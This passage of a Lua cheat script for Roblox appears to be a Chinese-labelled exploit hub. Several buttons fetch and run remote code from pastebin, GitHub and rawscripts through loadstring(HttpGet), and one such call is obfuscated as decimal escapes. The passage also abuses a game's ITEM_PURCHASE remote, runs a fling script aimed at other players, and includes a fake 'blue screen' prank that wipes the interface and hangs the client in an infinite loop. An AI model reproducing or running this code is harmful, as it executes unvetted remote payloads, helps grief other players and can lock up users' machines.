Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minizum.TextScaled = true
Minizum.TextSize = 14.000
Minizum.TextWrapped = true

Stop.Name = "Stop"
Stop.Parent = Frame_2
Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
Stop.Size = UDim2.new(0, 424, 0, 33)
Stop.Font = Enum.Font.SourceSans
Stop.Text = "Stop"
Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
Stop.TextSize = 30.000
Stop.TextWrapped = true

UICorner_4.Parent = Stop

IY.Name = "IY"
IY.Parent = Frame_2
IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
IY.Size = UDim2.new(0, 209, 0, 33)
IY.Font = Enum.Font.SourceSans
IY.Text = "Unmute Game"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 30.000
IY.TextWrapped = true

UICorner_5.Parent = IY

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Wait Speed       :"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Wait.Name = "Wait()"
Wait.Parent = Frame_2
Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Wait.BackgroundTransparency = 1.000
Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
Wait.Size = UDim2.new(0, 199, 0, 50)
Wait.ZIndex = 99999
Wait.ClearTextOnFocus = false
Wait.Font = Enum.Font.GothamSemibold
Wait.Text = "0.5"
Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
Wait.TextSize = 30.000
Wait.TextWrapped = true

--Sound Service:
local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 5
notification.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"

--funuction:
Exit.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)
local Mute = false
IY.MouseButton1Click:Connect(function()
	Mute = false
end)

_1E.MouseButton1Click:Connect(function()
	Mute = true
	while Mute == true do 
		wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

_3E.MouseButton1Click:Connect(function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
end)

local Active = true
SE.MouseButton1Click:Connect(function()
	Active = true
	while Active == true do
		local StringValue = Wait.Text
		wait(StringValue)
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		end
	end
end)

Stop.MouseButton1Click:Connect(function()
	Active = false
end)
--Credit:
notification:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "FEAG";
	Text = "FEAG Has Been Loaded , Made By Scripty#2063 (gamer14_123)";
	Icon = "";
	Duration = 10; 
	Button1 = "Yes Sir";
})
--Check:
while true do
	wait(0.5)
	local setting = game:GetService("SoundService").RespectFilteringEnabled
	if setting == true then
		Time.TextColor = BrickColor.new(255,0,0)
		Time.Text ="RespectFilteringEnabled(RFE) : true"
	elseif setting == false then
		Time.Text ="RespectFilteringEnabled(RFE) : false"
		Time.TextColor = BrickColor.new(0,255,0)
	end
end

  	end    

})

Tab:AddButton({

	Name = "物品漂浮（J飘/K回来）",

	Callback = function()

     local options = {
	CaptureAtMagnitude = 5,
    	EquipToolOnCapture = true,
    	ToolFloatBackSpeed = 500,
    	ToolFloatBackResponsiveness = 20,
    
    	HotKeys = {
		Release = Enum.KeyCode.J,
        	Capture = Enum.KeyCode.K
	}
}



local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")


local PLAYER = Players.LocalPlayer
local CHARACTER = PLAYER.Character or PLAYER.CharacterAdded:Wait()
local BACKPACK = PLAYER.Backpack
local HUMANOID_ROOT_PART = CHARACTER:WaitForChild("HumanoidRootPart")


local vA = {}



local function FolderToolParts(pA)
	local tvA = Instance.new("Folder")
    	tvA.Parent = pA

    	for lvA, lvB in next, pA:GetChildren() do
        	if lvB:IsA("BasePart") then
            		lvB.Parent = tvA
        	end
    	end
	
	return tvA
end

local function FindFirstTool()
	for lvA, lvB in next, CHARACTER:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
	end
	
	for lvA, lvB in next, BACKPACK:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
    	end


    	return nil
end

local function Release(pA)
	local tvA = FolderToolParts(pA)


    	if #tvA:GetChildren() > 0 then
        	for lvA, lvB in next, tvA:GetDescendants() do
            		if lvB:IsA("BasePart") then
                		lvB.CanCollide = true

                		local tvB = Instance.new("BodyForce")
                		tvB.Force = Vector3.new(0, lvB:GetMass() * workspace.Gravity, 0)
                		tvB.Parent = lvB
            		end
        	end

        	tvA.Parent = workspace
		
        	table.insert(vA, {tvA, pA})
	end
end

local function Capture(pA)
	if pA and pA[1] and pA[2] then
        	local tvA = pA[1]:GetChildren()


        	for lvA, lvB in next, tvA do
			lvB.CanCollide = false
        	end


        	local tvB = Instance.new("Attachment")
        	tvB.Parent = tvA[1]


        	local tvC = Instance.new("Attachment")
        	tvC.Position = Vector3.new(0, 0, -4)
        	tvC.Parent = HUMANOID_ROOT_PART


        	local tvD = Instance.new("AlignPosition")
        	tvD.RigidityEnabled = false
        	tvD.Responsiveness = options.ToolFloatBackResponsiveness
        	tvD.MaxVelocity = options.ToolFloatBackSpeed
        	tvD.MaxForce = options.ToolFloatBackSpeed

        	tvD.Attachment0 = tvB
        	tvD.Attachment1 = tvC
        	tvD.Parent = tvA[1]


        	repeat
			wait()
		until (tvA[1].Position - HUMANOID_ROOT_PART.Position).Magnitude < options.CaptureAtMagnitude


        	for lvA, lvB in next, pA[1]:GetChildren() do
            		local tvE = lvB:FindFirstChildOfClass("BodyForce")
            
            		if tvE then
                		tvE:Destroy()
            		end

            		lvB.Parent = pA[2]
        	end


        	tvB:Destroy()
        	tvC:Destroy()
        	tvD:Destroy()


        	pA[1]:Destroy()
        	pA[2].Parent = options.EquipToolOnCapture and CHARACTER or BACKPACK


        	return true
	end
	
	return false
end



UserInputService.InputBegan:Connect(function(pA, pB)
	if pB == false and pA.UserInputType == Enum.UserInputType.Keyboard then
        	if pA.KeyCode == options.HotKeys.Release then
            		local tvA = FindFirstTool()

			if tvA then
				if tvA.Parent ~= CHARACTER then
					tvA.Parent = CHARACTER
					wait(0.5)
				end

				Release(tvA)
			end
		elseif pA.KeyCode == options.HotKeys.Capture then
            		if #vA > 0 and Capture(vA[#vA]) then
                		table.remove(vA, #vA)
            		end
        	end
	end
end)



settings().Physics.AllowSleep = false
sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius", math.huge)

  	end    

})

Tab:AddButton({

	Name = "人体分离术",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/%E5%B7%A5%E4%BD%9C%E5%AE%A4.LUA", true))()

  	end    

})

Tab:AddButton({

	Name = "去除迷雾",

	Callback = function()

      if state then
        game.Lighting.FogStart = 3276634343
        game.Lighting.FogEnd = 3276734343
    else
        game.Lighting.FogStart = 0
    end

  	end    

})

Tab:AddButton({

	Name = "部位消失",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()

  	end    

})

Tab:AddButton({

	Name = "时间控制器（仅自己）",

	Callback = function()

     loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()

  	end    

})

Tab:AddButton({

	Name = "蓝屏警告",

	Callback = function()

     local coregui = game:service'CoreGui'

local sound = Instance.new('Sound', coregui)
sound.SoundId = 'rbxassetid://865599816'
sound.Volume = 3
sound.Looped = true

local gui = Instance.new('ScreenGui', coregui)
local image = Instance.new('ImageLabel', gui)
image.Position = UDim2.new(0, 0, -0.05, 0)
image.Size = UDim2.new(1, 0, 1.05, 0)
image.Image = "rbxassetid://9637192164"
image.Visible = false

task.wait(1)

for i,v in pairs(coregui:GetChildren()) do
    if v ~= gui and v ~= sound then
        v:Destroy()   
    end
end

if (not UserSettings().GameSettings:InFullScreen()) then
    game:service'GuiService':ToggleFullscreen()    
end

game:service'UserInputService'.MouseIconEnabled = false
sound:Play()
image.Visible = true

task.wait(1)

while true do end

  	end    

})

Tab:AddButton({

	Name = "r15变r6",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()

  	end    

})

Tab:AddButton({

	Name = "圆圈护盾（伪无敌）",

	Callback = function()

     Instance.new("ForceField", game.Players.LocalPlayer.Character)

  	end    

})

Tab:AddButton({

	Name = "无限连跳",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()

  	end    

})

Tab:AddButton({

	Name = "移除头发",

	Callback = function()

     assets = {540034631, 178993946, 461493477, 110288809}
me = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'
for i,v in pairs(me.Parent:GetChildren()) do
if v:IsA'Accoutrement' then v.Parent = nil end
end
for i,v in pairs(assets) do
  game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('xdd', tostring(game:GetService'MarketplaceService':GetProductInfo(v).AssetTypeId), v)
end
me.WalkSpeed = 50 --same
mouse = game:GetService'Players'.LocalPlayer:GetMouse()
exploded = false
boom = mouse.Button1Down:connect(function()
if exploded == true then return end
exploded = true
game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('boom', '8', '1527622')
print'exploding!!!'
exploded = true
boom:Disconnect()
end)

  	end    

})

Tab:AddButton({

	Name = "防空警报",

	Callback = function()

     local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://792323017"
    sound.Parent = game.Workspace
    sound:Play()

  	end    

})

Tab:AddButton({

	Name = "FE动作",

	Callback = function()

     loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()

  	end    

})

Tab:AddButton({

	Name = "显示帧率",

	Callback = function()

      -- Gui to Lua 
 -- Version: 3.2 
  
 -- Instances:
 local ScreenGui = Instance.new("ScreenGui") 
 local FpsLabel = Instance.new("TextLabel")
 
 --Properties:
 
 ScreenGui.Name = "FPSGui" 
 ScreenGui.ResetOnSpawn = false 
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
 
 FpsLabel.Name = "FPSLabel" 
 FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
 FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
 FpsLabel.BackgroundTransparency = 1 
 FpsLabel.Font = Enum.Font.SourceSansBold 
 FpsLabel.Text = "帧率: 0" 
 FpsLabel.TextSize = 20 
 FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
 FpsLabel.Parent = ScreenGui 
  
 function updateFpsLabel() 
     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
     FpsLabel.Text = "帧率: " .. fps 
 end 
  
  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
  
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")


 animateCredits()

  	end    

})

Tab:AddButton({

	Name = "旋转甩飞",

	Callback = function()

     game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="汉化鹤"; Duration = 4; })
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="原作者: topit "; Duration = 4; })

local PlayerService = game:GetService("Players")--:GetPlayers()
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local plr = PlayerService.LocalPlayer
local mouse = plr:GetMouse()
local BodyThrust = nil
local Dragging = {}

local Suggestions = {
    2298830673, 300, 365, --gamier (test game)
    1537690962, 250, 350, --bee swarm sim
    5580097107, 300, 400, --frappe
    2202352383, 275, 350, --super power training sim
    142823291, 350, 425,  --murder mystery 2
    155615604, 273, 462,  --prison life
    1990228024, 200, 235, --bloxton hotels
    189707, 250, 325,     --natural disaster survival
    230362888, 265, 415,  --the normal elevator       (may not work)
    5293755937, 335, 435, --speedrun sim
    537413528, 300, 350,  --build a boat              (may not work)
    18540115, 300, 425,   --survive the disasters
    2041312716, 350, 465  --Ragdoll engine
}


local version = ""
local font = Enum.Font.FredokaOne

local AxisPositionX = {
	0.05, 
	0.35,
	0.65
}

local AxisPositionY = {
	40, --edit fling speed
	90, --toggle fling types (normal, qfling, serverkek)
	140, --extra (respawn)
	190, --edit gui settings (hotkey, theme)
	240
}

local Fling = {
	false, --toggle
	"", --hotkey
	300, --speed
	false, --server
	false --stop vertfling
}


--[[themes:]]--

local Theme_JeffStandard = {
	Color3.fromRGB(15, 25, 35),   
	Color3.fromRGB(10, 20, 30),   
	Color3.fromRGB(27, 42, 53),   
	Color3.fromRGB(25, 35, 45),   
	Color3.fromRGB(20, 30, 40),   
	Color3.fromRGB(25, 65, 45),   
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(245, 245, 255),
	Color3.fromRGB(155, 155, 255) 
}
local Theme_Dark = {
	Color3.fromRGB(25, 25, 25),   --Top bar
	Color3.fromRGB(10, 10, 10),   --Background
	Color3.fromRGB(40, 40, 40),   --Border color
	Color3.fromRGB(35, 35, 35),   --Button background
	Color3.fromRGB(20, 20, 20),   --Unused
	Color3.fromRGB(25, 100, 45),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Steel = {
	Color3.fromRGB(25, 25, 35),   --Top bar
	Color3.fromRGB(10, 10, 20),   --Background
	Color3.fromRGB(40, 40, 50),   --Border color
	Color3.fromRGB(35, 35, 45),   --Button background
	Color3.fromRGB(20, 20, 25),   --Unused
	Color3.fromRGB(25, 100, 55),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Rust = {
	Color3.fromRGB(45, 25, 25),   
	Color3.fromRGB(30, 10, 10),   
	Color3.fromRGB(60, 40, 40),   
	Color3.fromRGB(55, 35, 35),   
	Color3.fromRGB(40, 20, 20),   
	Color3.fromRGB(45, 100, 45),  
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(255, 245, 255),
	Color3.fromRGB(175, 155, 255) 
}
local Theme_Violet = {
	Color3.fromRGB(35, 25, 45),   --Top bar
	Color3.fromRGB(20, 10, 30),   --Background
	Color3.fromRGB(50, 40, 60),   --Border color
	Color3.fromRGB(45, 35, 55),   --Button background
	Color3.fromRGB(30, 20, 40),   --Unused
	Color3.fromRGB(35, 100, 65),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Space = {
	Color3.fromRGB(10, 10, 10),   --Top bar
	Color3.fromRGB(0, 0, 0),   --Background
	Color3.fromRGB(20, 20, 20),   --Border color
	Color3.fromRGB(15, 15, 15),   --Button background
	Color3.fromRGB(5, 5, 5),   --Unused
	Color3.fromRGB(20, 25, 50),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_SynX = {
	Color3.fromRGB(75, 75, 75),   --Top bar
	Color3.fromRGB(45, 45, 45),   --Background
	Color3.fromRGB(45, 45, 45),   --Border color
	Color3.fromRGB(75, 75, 75),   --Button background
	Color3.fromRGB(0, 0, 5),   --Unused
	Color3.fromRGB(150, 75, 20),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}


local SelectedTheme = math.random(1,6)
if SelectedTheme == 1 then
    SelectedTheme = Theme_Steel
elseif SelectedTheme == 2 then
    SelectedTheme = Theme_Dark
elseif SelectedTheme == 3 then
    SelectedTheme = Theme_Rust
elseif SelectedTheme == 4 then
    SelectedTheme = Theme_Violet
elseif SelectedTheme == 5 then
    SelectedTheme = Theme_Space
elseif SelectedTheme == 6 then
    if syn then
        SelectedTheme = Theme_SynX
    else
        SelectedTheme = Theme_JeffStandard
    end
end

--[[instances:]]--
local ScreenGui = Instance.new("ScreenGui")
local TitleBar = Instance.new("Frame")
local Shadow = Instance.new("Frame")
local Menu = Instance.new("ScrollingFrame")

local TitleText = Instance.new("TextLabel")
local TitleTextShadow = Instance.new("TextLabel")
local CreditText = Instance.new("TextLabel")
local SuggestionText = Instance.new("TextLabel")

local SpeedBox = Instance.new("TextBox")
local Hotkey = Instance.new("TextBox")

local SpeedUp = Instance.new("TextButton")
local SpeedDown = Instance.new("TextButton")
local ToggleFling = Instance.new("TextButton")
local ToggleServerKill = Instance.new("TextButton")
local NoVertGain = Instance.new("TextButton")
local Respawn = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")

--local BodyThrust = Instance.new("BodyThrust")

ScreenGui.Name = "JeffFling"
ScreenGui.Parent = game.CoreGui
ScreenGui.Enabled = true

TitleBar.Name = "Title Bar"
TitleBar.Parent = ScreenGui
TitleBar.BackgroundColor3 = SelectedTheme[1]
TitleBar.BorderColor3 = SelectedTheme[3]
TitleBar.Position = UDim2.new(-0.3, 0, 0.7, 0)
TitleBar.Size = UDim2.new(0, 400, 0, 250)
TitleBar.Draggable = true
TitleBar.Active = true
TitleBar.Selectable = true
TitleBar.ZIndex = 100

Shadow.Name = "Shadow"
Shadow.Parent = TitleBar
Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Shadow.BackgroundTransparency = 0.5
Shadow.BorderSizePixel = 0
Shadow.Position = UDim2.new(0, 5, 0, 5)
Shadow.Size = TitleBar.Size
Shadow.ZIndex = 50

Menu.Name = "Menu"
Menu.Parent = TitleBar
Menu.BackgroundColor3 = SelectedTheme[2]
Menu.BorderColor3 = SelectedTheme[3]
Menu.AnchorPoint = Vector2.new(0,0)
Menu.Position = UDim2.new(0, 0, 0, 50)
Menu.Size = UDim2.new(0, 400, 0, 200)
Menu.CanvasSize = UDim2.new(0, TitleBar.Size.X, 0, 325)
Menu.ScrollBarImageTransparency = 0.5
Menu.ZIndex = 200

TitleText.Name = "Title Text"
TitleText.Parent = TitleBar
TitleText.AnchorPoint = Vector2.new(0, 0)
TitleText.Position = UDim2.new(0, 100, 0, 25)
TitleText.Font = font
TitleText.Text = "旋转甩飞脚本【汉化作者：鹤】"..version
TitleText.TextColor3 = SelectedTheme[8]
TitleText.TextSize = 28
TitleText.ZIndex = 300
TitleText.BackgroundTransparency = 1

TitleTextShadow.Name = "Shadow"
TitleTextShadow.Parent = TitleText
TitleTextShadow.Font = font
TitleTextShadow.Text = "甩飞"..version
TitleTextShadow.TextSize = 28
TitleTextShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleTextShadow.TextTransparency = 0.5
TitleTextShadow.Position = UDim2.new(0, 5, 0, 5)
TitleTextShadow.ZIndex = 250
TitleTextShadow.BackgroundTransparency = 1

SuggestionText.Name = "Suggestion Text"
SuggestionText.Parent = Menu
SuggestionText.Position = UDim2.new(0, 20, 0, 250)
SuggestionText.Font = font
SuggestionText.Text = "e"
SuggestionText.TextColor3 = SelectedTheme[7]
SuggestionText.TextSize = 24
SuggestionText.TextXAlignment = Enum.TextXAlignment.Left
SuggestionText.ZIndex = 300
SuggestionText.BackgroundTransparency = 1

CreditText.Name = "Credit Text"
CreditText.Parent = Menu
CreditText.Position = UDim2.new(0, 20, 0, 300)
CreditText.Font = font
CreditText.Text = "原作者: topit 汉化:鹤 "
CreditText.TextColor3 = SelectedTheme[7]
CreditText.TextSize = 20
CreditText.TextXAlignment = Enum.TextXAlignment.Left
CreditText.ZIndex = 300
CreditText.BackgroundTransparency = 1

SpeedBox.Name = "速度"
SpeedBox.Parent = Menu
SpeedBox.BackgroundColor3 = SelectedTheme[4]
SpeedBox.BorderColor3 = SelectedTheme[3]
SpeedBox.TextColor3 = SelectedTheme[7]
SpeedBox.Position = UDim2.new(AxisPositionX[1], 0, 0, AxisPositionY[1])
SpeedBox.Size = UDim2.new(0, 100, 0, 25)
SpeedBox.Font = Enum.Font.FredokaOne
SpeedBox.Text = "现在的速度: "..Fling[3]
SpeedBox.PlaceholderText = "甩飞速度"
SpeedBox.TextScaled = true
SpeedBox.ZIndex = 300

Hotkey.Name = "Custom Hotkey"
Hotkey.Parent = Menu
Hotkey.BackgroundColor3 = SelectedTheme[4]
Hotkey.BorderColor3 = SelectedTheme[3]
Hotkey.TextColor3 = SelectedTheme[7]
Hotkey.Position = UDim2.new(AxisPositionX[2], 0, 0, AxisPositionY[3])
Hotkey.Size = UDim2.new(0, 100, 0, 25)
Hotkey.Font = Enum.Font.FredokaOne
Hotkey.Text = "推荐5"
Hotkey.PlaceholderText = "数值:"
Hotkey.TextScaled = true
Hotkey.ZIndex = 300

SpeedUp.Name = "Speed Up"
SpeedUp.Parent = Menu
SpeedUp.BackgroundColor3 = SelectedTheme[4]
SpeedUp.BorderColor3 = SelectedTheme[3]
SpeedUp.TextColor3 = SelectedTheme[7]
SpeedUp.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[1]))
SpeedUp.Size = UDim2.new(0, 100, 0, 25)
SpeedUp.Font = Enum.Font.FredokaOne
SpeedUp.Text = "增加"
SpeedUp.TextScaled = true
SpeedUp.ZIndex = 300

SpeedDown.Name = "Speed Down"
SpeedDown.Parent = Menu
SpeedDown.BackgroundColor3 = SelectedTheme[4]
SpeedDown.BorderColor3 = SelectedTheme[3]
SpeedDown.TextColor3 = SelectedTheme[7]
SpeedDown.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[1]))
SpeedDown.Size = UDim2.new(0, 100, 0, 25)
SpeedDown.Font = Enum.Font.FredokaOne
SpeedDown.Text = "减少"
SpeedDown.TextScaled = true
SpeedDown.ZIndex = 300

ToggleFling.Name = "Fling toggle"
ToggleFling.Parent = Menu
ToggleFling.BackgroundColor3 = SelectedTheme[4]
ToggleFling.BorderColor3 = SelectedTheme[3]
ToggleFling.TextColor3 = SelectedTheme[7]
ToggleFling.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[2]))
ToggleFling.Size = UDim2.new(0, 100, 0, 25)
ToggleFling.Font = Enum.Font.FredokaOne
ToggleFling.Text = "点击旋转"
ToggleFling.TextScaled = true
ToggleFling.ZIndex = 300

Respawn.Name = "Respawn"
Respawn.Parent = Menu
Respawn.BackgroundColor3 = SelectedTheme[4]
Respawn.BorderColor3 = SelectedTheme[3]
Respawn.TextColor3 = SelectedTheme[7]
